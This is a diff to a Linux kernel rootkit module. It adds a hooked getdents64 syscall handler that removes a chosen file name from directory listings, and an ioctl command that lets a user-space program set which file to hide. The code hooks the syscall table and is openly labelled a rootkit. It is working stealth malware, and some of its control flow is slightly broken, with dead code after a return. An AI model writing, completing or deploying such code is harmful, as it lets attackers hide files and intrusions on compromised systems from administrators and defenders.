@@ -33,6 +33,7 @@ static unsigned long *__sys_call_table;
 static void (*update_mapping_prot)(unsigned long, unsigned long, unsigned long, unsigned long);
 static unsigned long start_rodata;
 static unsigned long init_begin;
+static struct hided_file file_to_hide = {0};
 
 typedef asmlinkage unsigned long (*orgin_syscall)(const struct pt_regs *);
 static orgin_syscall orig_kill;
@@ -97,7 +98,58 @@ static asmlinkage int hook_kill(const struct pt_regs *regs)
 // hook getdents64
 static asmlinkage int hook_getdents(const struct pt_regs *regs)
 {
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->regs[1];
+	int ret = orig_getdents64(regs);
+	struct linux_dirent64 *current_dir, *dirent_ker, *prev = NULL;
+	unsigned long offset = 0;
 
+	// Allocate kernel space buffer for directory entries
+	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	if (!dirent_ker)
+	{
+		return ret;
+	}
+
+	// Copy from user space to kernel space
+	if (copy_from_user(dirent_ker, dirent, ret))
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+
+	// Iterate over the directory entries
+	while (offset < ret)
+	{
+		current_dir = (void *)dirent_ker + offset;
+
+		// If the current entry matches the file to hide, remove it from the list
+		if (strncmp(current_dir->d_name, file_to_hide.name, file_to_hide.len) == 0)
+		{
+			if (current_dir == dirent_ker)
+			{
+				ret -= current_dir->d_reclen;
+				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += current_dir->d_reclen;
+		}
+		else
+		{
+			prev = current_dir;
+		}
+
+		offset += current_dir->d_reclen;
+	}
+
+	// Copy the modified directory entries back to user space
+	if (copy_to_user(dirent, dirent_ker, ret))
+	{
+		kfree(dirent_ker);
+		return -EFAULT;
+	}
+
+	kfree(dirent_ker);
+	return ret;
 	return 0;
 }
 
@@ -234,10 +286,21 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 		break;
 	}
 
-	break;
 	case IOCTL_FILE_HIDE:
-
+	{
+		// Copy the hided_file structure from user space
+		if (copy_from_user(&file_to_hide, (struct hided_file __user *)arg, sizeof(file_to_hide)))
+		{
+			ret = -EFAULT;
+		}
+		else
+		{
+			printk(KERN_INFO "Hiding file: %s\n", file_to_hide.name);
+		}
 		break;
+	}
+
+	break;
 	default:
 		ret = -EINVAL;
 	}
